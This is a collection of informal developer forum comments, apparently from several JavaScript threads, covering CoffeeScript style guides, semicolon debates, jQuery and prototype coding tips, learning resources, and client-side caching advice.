Write new JS in CoffeeScript. **NO** Use soft-tabs with a two space indent. **NO** Always use camelCase, never underscores. **YES** Use implicit parentheses when possible. **To make your coffescript more clear? See item one.** Follow @jashkenas's style. See the documentation for good examples. **More Coffescript. No.** Any top level objects should be namespaced under the GitHub namespace. **Good Idea. Don't Pollute Window.** Don't ever use $.get or $.post. Instead use $.ajax and provide both a success handler and an error handler. **YES. I should add that the deferred-style nomenclature is preferable, for success, etc.** Use $.fn.on instead of $.fn.bind, $.fn.delegate and $.fn.live. **YES YES YES YES YES** 
Some developers/teams get really uppity about semi-colons. I've even heard such teams claim it's a firable offense. Mainly because it's optional syntax and "noobs" don't know any better, so it shows you don't understand the language you're using. Then the argument came that come compression libraries. That can fail without the use of semi-colons under certain conditions and the up-the-fuck-shut pretty quickly. It's flavor, just keep your code sane, readable, tested, and working. I don't give two shits about a semi-colon here or there.
I guess it's a style. I program in other languages that require them, so the semi-colon usage just carries over.
I'd say it forces you to understand and correctly cope with additional language quirks. I've never once had to worry about #4 while using semicolons, for instance. If you drop the semicolons you have to be aware of it, but how is that awareness beneficial?
Setting semicolons adds robustness. You can comment out every line of code at will. You don't have to check your code if it will still be valid afterwards. Same goes for the case when you remove these commented lines again. During debugging phases this happens all the time, so semicolons do provide a benefit.
This is absolutely a case where the theory is crucial. I never bothered reading through every line of the code generated by yacc/lex myself, but the reason I didn't need to was because it implements a general pattern that can be understood thoroughly, unlike the thousands of lines generated by tools. It looks like this course covers PEGs instead of CFGs, so if you're interested in the output of yacc/lex, be sure to look up LALR and shift-reduce parsers, possibly after going through the course.
Always always always use semicolons
when all available browsers support coffeescript I'll bother to learn it. 
yes it does, but not in the browser.
OMG streams!
&gt; although JSON should not allow 'undefined' Sure, agreed. However IMO you should strive for robustness where possible/reasonable. Since for OP's purposes both versions work, but ===/== is more robust I say use that. Let's say later on OP adds some sort of localStorage caching layer in front of their AJAX request...or just some other module that may monkey-patch the AJAX response....in those cases you may somehow end up with a property that holds the value "undefined". Robust code will handle this change gracefully, instead of forcing OP to go back and start adding different logic everywhere. Though, really I think both versions are too liberal and OP should do more specific checks. This section of code doesn't look like it's going to run very often and the DOM manipulation is going to take much longer than the several checks. If this was a very hot/important section of code, I would probably use a more liberal check like "in" or "== null" etc in the interest of speed.
While I agree, these are their internal guidelines, they're a Ruby shop and CoffeeScript is pretty much JavaScript for Rubyists (which is what puts me off it most, personally), with its myriad ways to write the same statement, implicit return and (sometimes) optional parens for people who want to write function calls which look "Englishey" and pretend it's a DSL ;-)
Thanks ton! You really took time to explain all this to me. Unfortunately I can up vote you just once. Thanks a ton!
&gt;Let's say later on OP adds some sort of localStorage caching layer in front of their AJAX request...or just some other module that may monkey-patch the AJAX response YAGNI, but the real problem there, IMO, is that those modifications violate the terms of the interface i.e. that it should always be JSON. You shouldn't change the calling code to prepare for the possibility that the contract will be broken, you should should make the other code comply to the contract. Otherwise, you'd have to test for a huge number of deviations in a variety of places in potentially many different modules. That's tilting at windmills. It's far better for the called code to JSON.parse(JSON.stringify(obj)) (or whatever) it before it's returned. That would handle this gracefully. However, if an 'undefined' was output and not-detected by the serverside JSON generator, I'd consider that so FUBAR that I wouldn't want it handled gracefully. It's the usual defensive vs. failhard debate, to an extent. 
FWIW, you can also generate streaming zip files in PHP like this: &lt;? file_put_contents($tmpfile, implode("\n", $files)); passthru("zip -qr - -i@$tmpfile"); ?&gt; (storing the file list in a temporary file to avoid shell encoding issues)
But coffee-script is so much better :(
[Eloquent Javascript](http://eloquentjavascript.net/) free ebook or cheap paper book
Thank you. 
Thank you.
[Look through the resources linked on MDN](https://developer.mozilla.org/en-US/learn/javascript). Also, look at [MDN's JavaScript Reference](https://developer.mozilla.org/en/JavaScript/Reference) for details on various constructs.
I have also re-started brushing up my JS skills. Here is a list of things I do * I am not usually on twitter but do follow John Resig etc, find good JS devs and follow them on twitter * Read, read and code, and get comments from peers, I just did a small assignment and got it reviewed on /r/javascript, great learning experience * Eloquent JS is a good book, then JS Good parts is also good book * Go here http://ejohn.org/apps/learn/ * Mozilla Dev Network, Opera and even Apple dev network publishes good articles. I have been reading them on and off * Look at, at least, prototype.js and jquery.js source. Do look at them. Paul Irish, another guy to follow on twitter, has done some 2 videos on jQuery source. 
good stuff!! I remember the first time I saw some JS code, it made no freaking sense to me. (I was taught JAVA at my school, and then started working for a company that uses a lot of JS as well) 
[jQuery fundamentals](http://jqfundamentals.com/book/index.html) has a detailed chapter on "Javascript Basics" that you might find useful.
When creating elements in jQuery it is much better to use something such as: var $mylink = $('&lt;a/ &gt;', { 'id': 'MyID', 'class': 'myclasses', 'href':'http://www.mysite.com/', 'alt':'My Site!', 'text': 'My Site Link' }); Unless of course you need some nested elements, this not only makes it much easier to add in attributes, but iirc it allows jQuery to create the element tag directly rather than relying on having to parse the tags out. EDIT more stuff: On for loops, the general practice for the 3rd expression is "i++". Also, I would recommend caching your length variable, as every iteration of your for loop has call .length each time for the comparison expression. Example of my common practice: for (var i = 0, iL = myArray.length; i &lt; iL; i++) { // Do Stuff } For Classes in javascript, you typically want to use .prototype to add methods, as this allows the functions to be re-used in every instance of the class. (In your case it doesn't look too important as you just have 1 instance, but in an example where you might be creating many objects, this can become a huge performance hit.) Example: function MyClass(params) { this.Name = params.name; this.Width = params.width; this.Height = params.Height; } MyClass.prototype.GetArea = function () { return (this.Width * this.Height); } Without doing this, every instance of a class holds it's own separate instances of each method which can hurt your performance and how much memory your app is using.
Continued for more: For these rules: #topNavigation &gt; ul &gt; li &gt; ul a, #topNavigation &gt; ul &gt; li &gt; ul &gt; li ul, #topNavigation &gt; ul &gt; li &gt; ul a:hover Consider trying to use more classes or ids as necessary. Any rule more than 3 expressions deep normally indicates you should try to use classes.
Thank you
Thanks
Thank you
added the link above.
Mozdev gets my vote; TIAFAASITICE has linked it already. I found it beneficial to block W3 Schools (assuming you mean that and not W3C) in Google Search results. 
That's one of the nicest to read html ebooks I've seen.
I would recommend checking out [Backbone.js](http://backbonejs.org). Since backbone.js only gives a framework without an architecture, I would recommend reading the approach taken by the [Chaplin](https://github.com/moviepilot/chaplin) project. I used a tweaked variation of this to build [Plunker](http://plunker.no.de/edit). See the source on [github](https://github.com/ggoodman/stsh).
I understand the importance of having properties prototype-d, regarding that "i++", JSLint doesn't like it. And yes you are right, must have cached the length of an array. 
I down voted this because I see a lot of examples of framework applications and almost no examples of code. That thread was asking for beautiful examples of code.
I like the url: craig is making rainbows
Did anyone else think it is perfectly clear without annotations? Also, does this format var slice = ArrayProto.slice, unshift = ArrayProto.unshift, toString = ObjProto.toString, hasOwnProperty = ObjProto.hasOwnProperty; annoy other vim users as much as me?
This is the guide for lazy developers. The semicolon thing is a joke, sorry. You're not cool for skipping on the semicolons because some ruby guy learned you can do that and preaches about it like it's gods gift now. CS... its a cool experiment... but it doesn't solve a problem. Added complexity without solving a problem is never a good solution. 
Thanks for the recommendation! Backbone looks a little too heavy-duty for what I'm doing right now, but I'll keep it in mind for any future projects.
Thank you, that's a very informative blog post!
Thank you! His todo application was great because it let me look at the way JS is structured in many different frameworks.
Not knowing the details of this project, I would say that generally it is a *terrible* idea to use cookies to store "client side" information. Remember that cookies are sent to the server with *each* request, and using them as a generic storage facility will be severely detrimental to network performance. If you need to guarantee local storage, and you need it to work in browsers without LocalStorage, use persist.js. More than anything, it is silly to implement caching like this when there is already excellent caching support built into HTTP. You would just need to flick a few HTTP headers on that particular resource, and the browser would do the caching for you automatically.
yo dawg i hurd u like layer abstractions, so we put a language in your language so you can javascript while you coffeescript.
Or you want to be able to program for web browsers while keeping your code more readable and more maintainable. Also, if you want to be able to develop more quickly with less bugs.
I'm not a big fan of books alone. What I've found helpful is to use both a book and videos. Try getting one of the books recommended by the other people here, and then watch these [tutorials](http://www.youtube.com/playlist?list=PL46F0A159EC02DF82&amp;feature=plcp). Watching videos prevents me from simply glancing at the information, and it also keeps me engaged so that I am writing code at the same time as it is being presented. **Edit:** Grammar
Who would write that kind of code? Also, none of that looks particularly weird or surprising.
hmm, I forgot that cookies are sent with http headers. I guess what I done is indeed silly.
I use vim, but don't see what you mean. Care to elaborate. 
my suggestion is not to append to dom immediately. my suggestion is to append to the disconnected &lt;ul&gt; in the loop. Keep in mind that using jquery.append on disconnected nodes is not the same as appending to dom. Otherwise there would be no sense in using disconnected nodes, and everyone would use string concats.
question: this kind of documentation is generated by drocco, right? yesterday I was thinking about using drocco to document plain html files. If you ever had to work with html form a lousy designer, you know the source of my motivation :)
Looks like Mad of the realm god... the differences are in the source code on github :D
You ought to throw some buffering on that bad boy so that it doesn't render in such a jerky fashion. Someone who doesn't know better about how the code works might think it was written poorly otherwise.
It's right now, that I wish my computer had Active Desktop. This would make a sweet desktop wallpaper. 
Neo4j is a Graph Database. I wrote some code to pull subgraphs of the 9 github languages as an example and pass it on to D3.js to render.